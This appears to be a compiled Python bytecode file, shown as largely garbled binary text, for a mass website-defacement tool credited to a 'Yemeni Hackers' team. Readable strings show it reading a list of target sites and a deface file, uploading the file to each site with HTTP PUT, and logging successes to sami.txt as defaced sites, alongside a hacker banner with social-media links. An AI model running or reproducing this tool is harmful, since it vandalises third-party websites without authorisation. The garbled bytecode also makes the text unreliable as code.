a

����Scz��ã����������������	���@���s���d�dl�Z�d�dlZd�dlmZmZ�dd�ZdZdZdZdZ	d	Z
d
ZdZdd
�Z
e��e
��edejdejdejdej�eed��dS�)é����N)ÚForeÚStylec�������������������C���s���t� d¡�td�d�S�)NÚclearu��[1;32m
 â    â                ââââ                  â   
 ââ  ââ  â ââ         ââ   â  âââ   âââââ  âââ   
 â ââ â  ââ  â        âââââ  â   â  â â â    â   
 â ââ â  â                ââ âââââ  â â â    â   
 â    â  â            ââââââ âââââ  â â â  âââââ 
[1;32m							 
#################################################
[1;31mAuthor:    [1;32mMr Sami Yemeni Hackers
[1;31mGitHub:    [1;32mhttps://github.com/mr-sami-x
[1;31mFacebook: [1;32m T.Y.G TEAM
[1;31mTelegram: [1;32m t.me/TYG_TEAM
[1;31mTwitter:   [1;32mtwitter.com/Sami_Soft0
#################################################

		)ÚosÚsystemÚprint©�r���r���ú)/home/kali/Desktop/Digital Storm/email.pyÚbanner���s����
r
���z[1;31mz[1;32mz[1;33mz[1;34mz[1;35mz[1;36mz[1;37mc���������������	���C���sæ���t�d}�t|�d}t�d}t| ¡�}d|�}|D�]®}z| ¡�}d|vrPd|�}t ¡�j||�|d}|jdkr¬tt	j
dtj||��td	d
}| 
||�d�¡�| ¡��ntt	jdtj||��W�q2�tjjyÞ���Y�q2Y�q20�q2d�S�)
Nu2���[1;31m[+]â© Enter your sites list â©â© [1;32mÚru.���[1;31m[+]â© Enter deface file â©â© [1;32mú/zhttp://)ÚdataéÈ���u���[1;32mOK >> T.Y.G TEAM â©â©zsami.txtÚaÚ
u���[1;31mNO >> T.Y.G TEAM â©â©)ÚinputÚopenÚreadÚstripÚrequestsÚSessionÚputÚstatus_coder���r���ÚCYANr���Ú	RESET_ALLÚwriteÚcloseÚMAGENTAÚ
exceptionsÚRequestException)ÚlistÚopenedÚdr
���ÚiÚreqÚfr���r���r	���Úmain)���s&����



r&���r���z  [+]z#Deafced Sites are saved as sami.txtz[+]z Channel Telegram : t.me/TYG_TEAM)r���r���Úcoloramar���r���r
���ÚBRedÚBGreenÚBYellowÚBBlueÚBPurpleÚBCyanÚBWhiter&���r���r���r���r���r���r���r	���Ú<module>���s���
